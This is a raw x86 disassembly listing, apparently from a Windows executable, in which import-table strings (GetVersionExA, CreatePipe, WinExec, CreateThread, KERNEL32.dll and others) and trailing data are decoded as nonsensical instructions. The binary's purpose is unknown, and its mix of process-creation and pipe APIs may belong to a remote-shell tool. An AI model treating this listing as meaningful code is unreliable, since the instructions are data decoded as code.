  4134e5:	add    BYTE PTR [esi+0x74654701],cl
  4134eb:	push   esi
  4134ec:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4134f3:	dec    edi
  4134f4:	jb     0x41355d
  4134f6:	inc    ebp
  4134f7:	js     0x4134f9
  4134f9:	add    ch,cl
  4134fb:	add    BYTE PTR [ebp+0x73],al
  4134fe:	arpl   WORD PTR [ecx+0x70],sp
  413501:	add    BYTE PTR gs:[eax],al
  413504:	mov    bl,0x1
  413506:	push   eax
  413507:	outs   dx,DWORD PTR ds:[esi]
  413508:	ins    BYTE PTR es:[edi],dx
  413509:	jns    0x413572
  41350b:	outs   dx,DWORD PTR ds:[esi]
  41350c:	outs   dx,BYTE PTR ds:[esi]
  41350d:	add    BYTE PTR [ebx+0x65724300],ch
  413513:	popa   
  413514:	je     0x41357b
  413516:	push   edx
  413517:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41351c:	outs   dx,BYTE PTR ds:[esi]
  41351d:	add    BYTE PTR [ecx+eax*1+0x54746547],al
  413524:	gs js  0x41359b
  413527:	inc    ebp
  413528:	js     0x41359e
  41352a:	outs   dx,BYTE PTR gs:[esi]
  41352c:	je     0x41357e
  41352e:	outs   dx,DWORD PTR ds:[esi]
  41352f:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  413536:	jo     0x413538
  413538:	inc    ecx
  413539:	fs fs inc esi
  41353c:	outs   dx,DWORD PTR ds:[esi]
  41353d:	outs   dx,BYTE PTR ds:[esi]
  41353e:	je     0x413592
  413540:	gs jae 0x4135b2
  413543:	jne    0x4135b7
  413545:	arpl   WORD PTR [ebp+0x57],sp
  413548:	add    BYTE PTR [eax],al
  41354a:	inc    ecx
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x413594
  413550:	gs jbe 0x4135bc
  413553:	arpl   WORD PTR [ebp+0x43],sp
  413556:	popa   
  413557:	jo     0x4135cc
  413559:	add    BYTE PTR [esi+0x1],ch
  41355c:	inc    edi
  41355d:	gs je  0x4135b0
  413560:	imul   edi,DWORD PTR [eax+0x65],0xd500006c
  413567:	add    BYTE PTR [ebp+0x78],al
  41356a:	je     0x4135c0
  41356c:	gs js  0x4135e3
  41356f:	dec    edi
  413570:	jne    0x4135e6
  413572:	push   edi
  413573:	add    BYTE PTR [esi+0x65724300],ah
  413579:	popa   
  41357a:	je     0x4135e1
  41357c:	push   eax
  41357d:	popa   
  41357e:	je     0x4135f4
  413580:	gs jb  0x4135f1
  413583:	inc    edx
  413584:	jb     0x4135fb
  413586:	jae    0x4135f0
  413588:	add    BYTE PTR [eax],al
  41358a:	into   
  41358b:	add    BYTE PTR [ebp+0x78],al
  41358e:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413592:	gs inc ebx
  413594:	ins    BYTE PTR es:[edi],dx
  413595:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41359c:	lds    eax,FWORD PTR [eax]
  41359e:	inc    ebp
  41359f:	outs   dx,BYTE PTR ds:[esi]
  4135a0:	jne    0x41360f
  4135a2:	inc    esi
  4135a3:	outs   dx,DWORD PTR ds:[esi]
  4135a4:	outs   dx,BYTE PTR ds:[esi]
  4135a5:	je     0x4135ed
  4135a7:	popa   
  4135a8:	ins    DWORD PTR es:[edi],dx
  4135a9:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x47005773
  4135b1:	inc    esp
  4135b2:	dec    ecx
  4135b3:	xor    esi,DWORD PTR [edx]
  4135b5:	cs fs ins BYTE PTR es:[edi],dx
  4135b8:	ins    BYTE PTR es:[edi],dx
  4135b9:	add    BYTE PTR [edi+0x74654701],bl
  4135bf:	inc    ebx
  4135c0:	outs   dx,DWORD PTR ds:[esi]
  4135c1:	ins    DWORD PTR es:[edi],dx
  4135c2:	jo     0x413639
  4135c4:	je     0x41362b
  4135c6:	jb     0x413616
  4135c8:	popa   
  4135c9:	ins    DWORD PTR es:[edi],dx
  4135ca:	gs inc ecx
  4135cc:	add    BYTE PTR [eax],al
  4135ce:	sbb    eax,0x74655304
  4135d3:	dec    eax
  4135d4:	popa   
  4135d5:	outs   dx,BYTE PTR ds:[esi]
  4135d6:	fs ins BYTE PTR es:[edi],dx
  4135d8:	gs inc ebx
  4135da:	outs   dx,DWORD PTR ds:[esi]
  4135db:	jne    0x41364b
  4135dd:	je     0x4135df
  4135df:	add    BYTE PTR [edx],bh
  4135e1:	add    ecx,DWORD PTR [edi+0x70]
  4135e4:	outs   dx,BYTE PTR gs:[esi]
  4135e6:	inc    esi
  4135e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4300f200
  4135ef:	jb     0x413656
  4135f1:	popa   
  4135f2:	je     0x413659
  4135f4:	push   edi
  4135f5:	popa   
  4135f6:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4135fe:	ins    DWORD PTR es:[edi],dx
  4135ff:	gs jb  0x413643
  413602:	add    BYTE PTR [eax],al
  413604:	and    al,0x3
  413606:	dec    ebp
  413607:	popa   
  413608:	jo     0x413660
  41360a:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  413611:	ins    BYTE PTR es:[edi],dx
  413612:	add    BYTE PTR gs:[esp+eax*1],bh
  413616:	push   ebx
  413617:	gs je  0x41366e
  41361a:	push   0x64616572
  41361f:	push   eax
  413620:	jb     0x41368b
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	jb     0x41368e
  413625:	je     0x4136a0
  413627:	add    BYTE PTR [edx+0x6f6c4702],dl
  41362d:	bound  esp,QWORD PTR [ecx+0x6c]
  413630:	inc    edi
  413631:	gs je  0x413675
  413634:	je     0x4136a5
  413636:	ins    DWORD PTR es:[edi],dx
  413637:	dec    esi
  413638:	popa   
  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	gs push edi
  41363c:	add    BYTE PTR [eax],al
  41363e:	retf   
  41363f:	add    cl,BYTE PTR [ecx+0x73]
  413642:	inc    edx
  413643:	popa   
  413644:	fs push edx
  413646:	gs popa 
  413648:	fs push eax
  41364a:	je     0x4136be
  41364c:	add    BYTE PTR [eax],al
  41364e:	or     BYTE PTR [ecx],al
  413650:	inc    esp
  413651:	gs jbe 0x4136bd
  413654:	arpl   WORD PTR [ebp+0x49],sp
  413657:	outs   dx,DWORD PTR ds:[esi]
  413658:	inc    ebx
  413659:	outs   dx,DWORD PTR ds:[esi]
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	je     0x4136cf
  41365d:	outs   dx,DWORD PTR ds:[esi]
  41365e:	ins    BYTE PTR es:[edi],dx
  41365f:	add    BYTE PTR [ecx+0x1],bl
  413662:	inc    esi
  413663:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  41366a:	add    BYTE PTR gs:[edx],cl
  41366d:	add    al,BYTE PTR [edi+0x65]
  413670:	je     0x4136bf
  413672:	outs   dx,DWORD PTR ds:[esi]
  413673:	fs jne 0x4136e2
  413676:	gs dec eax
  413678:	popa   
  413679:	outs   dx,BYTE PTR ds:[esi]
  41367a:	fs ins BYTE PTR es:[edi],dx
  41367c:	gs inc ecx
  41367e:	add    BYTE PTR [eax],al
  413680:	inc    edx
  413681:	add    DWORD PTR [esi+0x69],eax
  413684:	outs   dx,BYTE PTR ds:[esi]
  413685:	fs dec esi
  413687:	gs js  0x4136fe
  41368a:	inc    ebx
  41368b:	push   0x65676e61
  413690:	dec    esi
  413691:	outs   dx,DWORD PTR ds:[esi]
  413692:	je     0x4136fd
  413694:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	outs   dx,BYTE PTR ds:[esi]
  41369c:	add    BYTE PTR [eax],al
  41369e:	xor    eax,0x74655304
  4136a3:	push   esp
  4136a4:	push   0x64616572
  4136a9:	inc    ecx
  4136aa:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  4136b1:	dec    ebp
  4136b2:	popa   
  4136b3:	jae    0x413720
  4136b5:	add    BYTE PTR [esi],bl
  4136b7:	add    al,BYTE PTR [edi+0x65]
  4136ba:	je     0x41370c
  4136bc:	jb     0x413727
  4136be:	outs   dx,DWORD PTR ds:[esi]
  4136bf:	jb     0x41372a
  4136c1:	je     0x41373c
  4136c3:	inc    ebx
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	popa   
  4136c6:	jae    0x41373b
  4136c8:	add    BYTE PTR [eax],al
  4136ca:	sti    
  4136cb:	add    DWORD PTR [edi+0x65],eax
  4136ce:	je     0x41371c
  4136d0:	popa   
  4136d1:	jae    0x413747
  4136d3:	inc    ebp
  4136d4:	jb     0x413748
  4136d6:	outs   dx,DWORD PTR ds:[esi]
  4136d7:	jb     0x4136d9
  4136d9:	add    BYTE PTR [edi],dl
  4136db:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4136df:	imul   eax,DWORD PTR [esi+0x69],0x6c
  4136e3:	add    BYTE PTR gs:[eax],al
  4136e6:	retf   
  4136e7:	add    DWORD PTR [edi+0x65],eax
  4136ea:	je     0x41372f
  4136ec:	jne    0x413760
  4136ee:	jb     0x413755
  4136f0:	outs   dx,BYTE PTR ds:[esi]
  4136f1:	je     0x413737
  4136f3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4136fa:	jns    0x413753
  4136fc:	add    BYTE PTR [eax],al
  4136fe:	mov    BYTE PTR [eax],al
  413700:	inc    ecx
  413701:	jb     0x413768
  413703:	inc    esi
  413704:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  41370c:	dec    esi
  41370d:	push   ebx
  41370e:	dec    ecx
  41370f:	add    BYTE PTR ds:0x74655304,ah
  413715:	dec    ebp
  413716:	popa   
  413717:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41371f:	outs   dx,WORD PTR ds:[esi]
  413721:	add    dl,cl
  413723:	add    BYTE PTR [ebx+0x72],al
  413726:	gs popa 
  413728:	je     0x41378f
  41372a:	inc    ebp
  41372b:	jbe    0x413792
  41372d:	outs   dx,BYTE PTR ds:[esi]
  41372e:	je     0x413771
  413730:	add    BYTE PTR [eax],al
  413732:	outs   dx,BYTE PTR ds:[esi]
  413733:	add    DWORD PTR [esi+0x69],eax
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	fs push edx
  413739:	gs jae 0x4137ab
  41373c:	jne    0x4137b0
  41373e:	arpl   WORD PTR [ebp+0x45],sp
  413741:	js     0x41379a
  413743:	add    BYTE PTR [eax+0x3],bh
  413746:	push   edx
  413747:	gs popa 
  413749:	fs inc esi
  41374b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47026100
  413753:	gs je  0x4137aa
  413756:	gs ins DWORD PTR es:[edi],dx
  413758:	jo     0x4137aa
  41375a:	popa   
  41375b:	je     0x4137c5
  41375d:	inc    ecx
  41375e:	add    BYTE PTR [eax],al
  413760:	mov    DWORD PTR [edx],eax
  413762:	inc    edi
  413763:	ins    BYTE PTR es:[edi],dx
  413764:	outs   dx,DWORD PTR ds:[esi]
  413765:	bound  esp,QWORD PTR [ecx+0x6c]
  413768:	inc    ecx
  413769:	ins    BYTE PTR es:[edi],dx
  41376a:	ins    BYTE PTR es:[edi],dx
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	arpl   WORD PTR [eax],ax
  41376e:	xchg   esp,eax
  41376f:	add    al,0x57
  413771:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  413778:	bound  eax,QWORD PTR [edx]
  41377a:	inc    edi
  41377b:	gs je  0x4137d2
  41377e:	gs ins DWORD PTR es:[edi],dx
  413780:	jo     0x4137d2
  413782:	popa   
  413783:	je     0x4137ed
  413785:	push   edi
  413786:	add    BYTE PTR [eax],al
  413788:	rol    BYTE PTR [eax],1
  41378a:	inc    ebx
  41378b:	jb     0x4137f2
  41378d:	popa   
  41378e:	je     0x4137f5
  413790:	inc    esi
  413791:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47026700
  413799:	gs je  0x4137f0
  41379c:	push   0x64616572
  4137a1:	dec    esp
  4137a2:	outs   dx,DWORD PTR ds:[esi]
  4137a3:	arpl   WORD PTR [ecx+0x6c],sp
  4137a6:	add    BYTE PTR gs:[eax],ah
  4137a9:	add    DWORD PTR [ebp+0x6e],eax
  4137ac:	jne    0x41381b
  4137ae:	push   edx
  4137af:	gs jae 0x413821
  4137b2:	jne    0x413826
  4137b4:	arpl   WORD PTR [ebp+0x4e],sp
  4137b7:	popa   
  4137b8:	ins    DWORD PTR es:[edi],dx
  4137b9:	gs jae 0x4137fd
  4137bc:	add    BYTE PTR [eax],al
  4137be:	repz add DWORD PTR [edi+0x65],eax
  4137c2:	je     0x41380a
  4137c4:	jne    0x413832
  4137c6:	ins    BYTE PTR es:[edi],dx
  4137c7:	push   eax
  4137c8:	popa   
  4137c9:	je     0x413833
  4137cb:	dec    esi
  4137cc:	popa   
  4137cd:	ins    DWORD PTR es:[edi],dx
  4137ce:	gs push edi
  4137d0:	add    BYTE PTR [eax],al
  4137d2:	push   eax
  4137d3:	add    DWORD PTR [esi+0x69],eax
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	gs push esp
  4137d9:	imul   ebp,DWORD PTR [ebp+0x65],0x79536f54
  4137e0:	jae    0x413856
  4137e2:	gs ins DWORD PTR es:[edi],dx
  4137e4:	push   esp
  4137e5:	imul   ebp,DWORD PTR [ebp+0x65],0xe60000
  4137ec:	inc    ebx
  4137ed:	jb     0x413854
  4137ef:	popa   
  4137f0:	je     0x413857
  4137f2:	push   edx
  4137f3:	gs ins DWORD PTR es:[edi],dx
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	je     0x41385d
  4137f8:	push   esp
  4137f9:	push   0x64616572
  4137fe:	add    BYTE PTR [eax],al
  413800:	jns    0x413804
  413802:	inc    edi
  413803:	gs je  0x41385c
  413806:	gs jb  0x41387c
  413809:	imul   ebp,DWORD PTR [edi+0x6e],0x1010000
  413810:	inc    esp
  413811:	gs ins BYTE PTR es:[edi],dx
  413813:	gs je  0x41387b
  413816:	inc    ebx
  413817:	jb     0x413882
  413819:	je     0x413884
  41381b:	arpl   WORD PTR [ecx+0x6c],sp
  41381e:	push   ebx
  41381f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  413824:	outs   dx,BYTE PTR ds:[esi]
  413825:	add    BYTE PTR [ecx],cl
  413827:	add    al,BYTE PTR [edi+0x65]
  41382a:	je     0x413879
  41382c:	outs   dx,DWORD PTR ds:[esi]
  41382d:	fs jne 0x41389c
  413830:	gs inc esi
  413832:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41383a:	add    BYTE PTR [eax],al
  41383c:	dec    edi
  41383d:	add    al,0x53
  41383f:	jne    0x4138b4
  413841:	jo     0x4138a8
  413843:	outs   dx,BYTE PTR ds:[esi]
  413844:	fs push esp
  413846:	push   0x64616572
  41384b:	add    ah,cl
  41384d:	add    al,0x6c
  41384f:	jae    0x4138c5
  413851:	jb     0x4138b6
  413853:	jo     0x4138ce
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	push   edi
  413857:	add    bh,dh
  413859:	add    DWORD PTR [edi+0x65],eax
  41385c:	je     0x4138a6
  41385e:	popa   
  41385f:	outs   dx,BYTE PTR ds:[esi]
  413860:	fs ins BYTE PTR es:[edi],dx
  413862:	gs dec ecx
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	outs   dx,WORD PTR ds:[esi]
  413867:	jb     0x4138d6
  413869:	popa   
  41386a:	je     0x4138d5
  41386c:	outs   dx,DWORD PTR ds:[esi]
  41386d:	outs   dx,BYTE PTR ds:[esi]
  41386e:	add    BYTE PTR [eax],al
  413870:	or     eax,DWORD PTR [ebx]
  413872:	dec    esp
  413873:	outs   dx,DWORD PTR ds:[esi]
  413874:	arpl   WORD PTR [ecx+0x6c],sp
  413877:	inc    ecx
  413878:	ins    BYTE PTR es:[edi],dx
  413879:	ins    BYTE PTR es:[edi],dx
  41387a:	outs   dx,DWORD PTR ds:[esi]
  41387b:	arpl   WORD PTR [eax],ax
  41387d:	add    BYTE PTR [ebx+0x2],ah
  413880:	inc    edi
  413881:	gs je  0x4138d8
  413884:	push   0x64616572
  413889:	inc    ebx
  41388a:	outs   dx,DWORD PTR ds:[esi]
  41388b:	outs   dx,BYTE PTR ds:[esi]
  41388c:	je     0x4138f3
  41388e:	js     0x413904
  413890:	add    BYTE PTR [eax],al
  413892:	ret    
  413893:	add    edx,DWORD PTR [edx+0x74]
  413896:	ins    BYTE PTR es:[edi],dx
  413897:	push   ebp
  413898:	outs   dx,BYTE PTR ds:[esi]
  413899:	ja     0x413904
  41389b:	outs   dx,BYTE PTR ds:[esi]
  41389c:	add    BYTE PTR fs:[ecx+eax*1+0x41746547],cl
  4138a4:	je     0x413915
  4138a6:	ins    DWORD PTR es:[edi],dx
  4138a7:	dec    esi
  4138a8:	popa   
  4138a9:	ins    DWORD PTR es:[edi],dx
  4138aa:	gs push edi
  4138ac:	add    BYTE PTR [eax],al
  4138ae:	jmp    0x6946:0x74654701
  4138b5:	ins    BYTE PTR es:[edi],dx
  4138b6:	gs inc ecx
  4138b8:	je     0x41392e
  4138ba:	jb     0x413925
  4138bc:	bound  esi,QWORD PTR [ebp+0x74]
  4138bf:	gs jae 0x413907
  4138c2:	js     0x413905
  4138c4:	add    BYTE PTR [eax],al
  4138c6:	inc    edx
  4138c7:	add    al,BYTE PTR [edi+0x65]
  4138ca:	je     0x41391f
  4138cc:	push   0x5074726f
  4138d1:	popa   
  4138d2:	je     0x41393c
  4138d4:	dec    esi
  4138d5:	popa   
  4138d6:	ins    DWORD PTR es:[edi],dx
  4138d7:	gs inc ecx
  4138d9:	add    bl,bl
  4138db:	add    edx,DWORD PTR [ebx+0x65]
  4138de:	popa   
  4138df:	jb     0x413944
  4138e1:	push   0x68746150
  4138e6:	inc    ecx
  4138e7:	add    BYTE PTR [eax+0x4],al
  4138ea:	push   ebx
  4138eb:	gs je  0x413942
  4138ee:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4138f5:	jne    0x41395c
  4138f7:	push   esp
  4138f8:	imul   ebp,DWORD PTR [ebp+0x65],0xb4000072
  4138ff:	add    edx,DWORD PTR [edx+0x65]
  413902:	ins    DWORD PTR es:[edi],dx
  413903:	outs   dx,DWORD PTR ds:[esi]
  413904:	jbe    0x41396b
  413906:	inc    esp
  413907:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41390e:	jns    0x413967
  413910:	add    BYTE PTR [eax],al
  413912:	ret    
  413913:	add    al,0x6c
  413915:	jae    0x41398b
  413917:	jb     0x41397c
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	jo     0x413973
  41391c:	add    BYTE PTR [eax],al
  41391e:	dec    edi
  41391f:	add    DWORD PTR [esi+0x69],eax
  413922:	ins    BYTE PTR es:[edi],dx
  413923:	gs push esp
  413925:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  41392c:	arpl   WORD PTR [ecx+0x6c],sp
  41392f:	inc    esi
  413930:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  413938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413939:	add    BYTE PTR [ebx+0x61],al
  41393c:	outs   dx,BYTE PTR ds:[esi]
  41393d:	arpl   WORD PTR [ebp+0x6c],sp
  413940:	push   edi
  413941:	popa   
  413942:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  41394a:	ins    DWORD PTR es:[edi],dx
  41394b:	gs jb  0x41394e
  41394e:	dec    ebx
  41394f:	inc    ebp
  413950:	push   edx
  413951:	dec    esi
  413952:	inc    ebp
  413953:	dec    esp
  413954:	xor    esi,DWORD PTR [edx]
  413956:	cs fs ins BYTE PTR es:[edi],dx
  413959:	ins    BYTE PTR es:[edi],dx
  41395a:	add    BYTE PTR [eax],al
  41395c:	inc    esi
  41395d:	add    BYTE PTR [eax+0x61],dl
  413960:	je     0x4139ca
  413962:	inc    esi
  413963:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  41396a:	outs   dx,BYTE PTR ds:[esi]
  41396b:	jae    0x4139d6
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	outs   dx,BYTE PTR ds:[esi]
  41396f:	inc    ecx
  413970:	add    BYTE PTR [eax],al
  413972:	inc    edi
  413973:	add    BYTE PTR [eax+0x61],dl
  413976:	je     0x4139e0
  413978:	inc    esi
  413979:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	jae    0x4139ec
  413983:	outs   dx,DWORD PTR ds:[esi]
  413984:	outs   dx,BYTE PTR ds:[esi]
  413985:	push   edi
  413986:	add    BYTE PTR [eax],al
  413988:	push   ebx
  413989:	dec    eax
  41398a:	dec    esp
  41398b:	push   edi
  41398c:	inc    ecx
  41398d:	push   eax
  41398e:	dec    ecx
  41398f:	cs fs ins BYTE PTR es:[edi],dx
  413992:	ins    BYTE PTR es:[edi],dx
  413993:	add    BYTE PTR [ebx+0x46],dh
  413996:	addr16 popa 
  413998:	pop    ecx
  413999:	dec    ebp
  41399a:	popa   
  41399b:	jns    0x4139f1
  41399d:	push   ecx
  41399e:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  4139a2:	je     0x413a05
  4139a4:	inc    ebx
  4139a5:	push   ecx
  4139a6:	ins    BYTE PTR es:[edi],dx
  4139a7:	pop    eax
  4139a8:	add    BYTE PTR [eax],al
  4139aa:	add    BYTE PTR [eax],al
  4139ac:	or     al,0x3e
  4139ae:	inc    ecx
  4139af:	add    BYTE PTR [esi+edi*1],dl
  4139b2:	inc    ecx
  4139b3:	add    ah,dh
  4139b5:	cmp    eax,DWORD PTR [ecx+0x0]
  4139b8:	call   0x794febc8
  4139bd:	dec    edi
  4139be:	ret    0x774e
  4139c1:	dec    edi
  4139c2:	cmp    eax,0x384f4f4f
  4139c7:	dec    edi
  4139c8:	jp     0x413a19
  4139ca:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139cd:	dec    edi
  4139ce:	ss dec edi
  4139d0:	add    ecx,DWORD PTR [edi+0x31]
  4139d3:	dec    edi
  4139d4:	ret    0x324e
  4139d7:	dec    edi
  4139d8:	push   ds
  4139d9:	push   edx
  4139da:	pop    ds
  4139db:	push   ebx
  4139dc:	cmp    DWORD PTR [edi+0x79],ecx
  4139df:	dec    edi
  4139e0:	ret    0x774e
  4139e3:	dec    edi
  4139e4:	cmp    eax,0x384f4f4f
  4139e9:	dec    edi
  4139ea:	jp     0x413a3b
  4139ec:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139ef:	dec    edi
  4139f0:	ss dec edi
  4139f2:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  4139f9:	dec    edi
  4139fa:	push   ds
  4139fb:	bound  ebx,QWORD PTR [edi]
  4139fd:	arpl   WORD PTR [ecx],di
  4139ff:	dec    edi
  413a00:	jns    0x413a51
  413a02:	ret    0x724e
  413a05:	dec    edi
  413a06:	cmp    eax,0x394f034f
  413a0b:	dec    edi
  413a0c:	dec    esp
  413a0d:	dec    edi
  413a0e:	xor    al,0x4f
  413a10:	ret    0x304e
  413a13:	dec    edi
  413a14:	push   ds
  413a15:	jb     0x413a36
  413a17:	jae    0x413a28
  413a19:	or     DWORD PTR [eax],0xffffff80
  413a1c:	js     0x4139ae
  413a1e:	jns    0x4139b1
  413a20:	aas    
  413a21:	dec    edi
  413a22:	jbe    0x413a73
  413a24:	ret    0x764e
  413a27:	dec    edi
  413a28:	ds dec edi
  413a2a:	dec    esp
  413a2b:	dec    edi
  413a2c:	cmp    DWORD PTR [edi+0x3],ecx
  413a2f:	dec    edi
  413a30:	xor    eax,0x364ec24f
  413a35:	dec    edi
  413a36:	push   ds
  413a37:	sbb    BYTE PTR [edi],0x83
  413a3a:	setae  BYTE PTR [eax]
  413a3d:	nop
  413a3e:	js     0x4139e0
  413a40:	jns    0x4139e3
  413a42:	aas    
  413a43:	dec    edi
  413a44:	jbe    0x413a95
  413a46:	ret    0x764e
  413a49:	dec    edi
  413a4a:	ds dec edi
  413a4c:	dec    esp
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x69],ecx
  413a51:	dec    edi
  413a52:	xor    eax,0x364ec24f
  413a57:	dec    edi
  413a58:	push   ds
  413a59:	xchg   edx,eax
  413a5a:	pop    ds
  413a5b:	xchg   ebx,eax
  413a5c:	bt     DWORD PTR [eax],ecx
  413a5f:	mov    al,ds:0xb179b078
  413a64:	aas    
  413a65:	dec    edi
  413a66:	push   0x4e4ec24f
  413a6b:	dec    edi
  413a6c:	cmp    eax,0x394f034f
  413a71:	dec    edi
  413a72:	push   ecx
  413a73:	dec    edi
  413a74:	xor    al,0x4f
  413a76:	ret    0x364e
  413a79:	dec    edi
  413a7a:	push   ds
  413a7b:	mov    ds:0xb30fa31f,al
  413a80:	or     BYTE PTR [eax-0x3e863f88],dh
  413a86:	aas    
  413a87:	dec    edi
  413a88:	push   0x4e4ec24f
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x394f784f
  413a93:	dec    edi
  413a94:	pop    edi
  413a95:	dec    edi
  413a96:	cmp    ecx,DWORD PTR [edi-0x3e]
  413a99:	dec    esi
  413a9a:	xor    eax,0x1fb21e4f
  413a9f:	mov    bl,0xf
  413aa1:	ret    
  413aa2:	or     al,al
  413aa4:	js     0x413a76
  413aa6:	jns    0x413a79
  413aa8:	aas    
  413aa9:	dec    edi
  413aaa:	push   0x4e4ec24f
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f724f
  413ab5:	dec    edi
  413ab6:	dec    esi
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	ret    0xc31f
  413ac2:	psrlq  mm1,QWORD PTR [eax]
  413ac5:	sar    BYTE PTR [eax-0x20],1
  413ac8:	jns    0x413aab
  413aca:	aas    
  413acb:	dec    edi
  413acc:	push   0x4e4ec24f
  413ad1:	dec    edi
  413ad2:	cmp    eax,0x394f734f
  413ad7:	dec    edi
  413ad8:	dec    esp
  413ad9:	dec    edi
  413ada:	xor    al,0x4f
  413adc:	ret    0x364e
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	rcr    BYTE PTR [edi],cl
  413ae3:	ror    DWORD PTR [edi],cl
  413ae5:	jecxz  0x413aef
  413ae7:	loopne 0x413b61
  413ae9:	lock jns 0x413add
  413aec:	aas    
  413aed:	dec    edi
  413aee:	ins    DWORD PTR es:[edi],dx
  413aef:	dec    edi
  413af0:	ret    0x5f4e
  413af3:	dec    edi
  413af4:	cmp    eax,0x3e4f524f
  413af9:	dec    edi
  413afa:	ret    0x3f4e
  413afd:	dec    edi
  413afe:	push   ds
  413aff:	loop   0x413b20
  413b01:	jecxz  0x413b12
  413b03:	repz or al,dh
  413b06:	js     0x413b08
  413b08:	jns    0x413b0b
  413b0a:	js     0x413b1c
  413b0c:	jns    0x413b1f
  413b0e:	ds dec edi
  413b10:	jg     0x413b61
  413b12:	ret    0x5b4e
  413b15:	dec    edi
  413b16:	cmp    al,0x4f
  413b18:	jb     0x413b69
  413b1a:	ds dec edi
  413b1c:	dec    ebp
  413b1d:	dec    edi
  413b1e:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b21:	dec    esi
  413b22:	xor    eax,0x1f021e4f
  413b27:	add    ecx,DWORD PTR [edi]
  413b29:	adc    ecx,DWORD PTR [eax]
  413b2b:	adc    BYTE PTR [eax+0x20],bh
  413b2e:	jns    0x413b51
  413b30:	aas    
  413b31:	dec    edi
  413b32:	add    BYTE PTR [eax],al
  413b34:	mov    esp,0xb0004139
  413b39:	cmp    eax,DWORD PTR [ecx+0x0]
  413b3c:	mov    eax,0x1800413b
  413b41:	ds inc ecx
  413b43:	add    BYTE PTR [ebp+edi*1+0x41],bh
  413b47:	add    BYTE PTR [eax],cl
  413b49:	ds inc ecx
  413b4b:	add    BYTE PTR [eax-0x63ffbec5],bl
  413b51:	cmp    eax,DWORD PTR [ecx+0x0]
  413b54:	add    BYTE PTR [esi],bh
  413b56:	inc    ecx
  413b57:	add    BYTE PTR [eax],al
  413b59:	cmp    al,0x41
  413b5b:	add    BYTE PTR [edx-0x4e076357],cl
  413b61:	mov    edx,0x3bb4f89c
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [eax],bh
  413b69:	cmp    eax,0x3d4c0041
  413b6e:	inc    ecx
  413b6f:	add    BYTE PTR [eax+0x3d],bl
  413b72:	inc    ecx
  413b73:	add    BYTE PTR [eax+0x3d],ch
  413b76:	inc    ecx
  413b77:	add    ah,ch
  413b79:	cmp    eax,DWORD PTR [ecx+0x0]
  413b7c:	mov    eax,0xc004139
  413b81:	cmp    al,0x41
  413b83:	add    ah,bh
  413b85:	cmp    eax,DWORD PTR [ecx+0x0]
  413b88:	sbb    al,0x3e
  413b8a:	inc    ecx
  413b8b:	add    BYTE PTR [ecx],dh
  413b8d:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413b94:	sar    BYTE PTR [ebx],0x41
  413b97:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413b9d:	or     eax,0x705
  413ba2:	inc    eax
  413ba3:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413ba7:	fnsave [edi+0x37]
  413baa:	inc    ebx
  413bab:	add    BYTE PTR [edx+0x68],dh
  413bae:	inc    ebp
  413baf:	inc    ecx
  413bb0:	(bad)  
  413bb1:	cli    
  413bb2:	jne    0x413c16
  413bb4:	(bad)  
  413bb5:	in     eax,dx
  413bb6:	inc    BYTE PTR [edi]
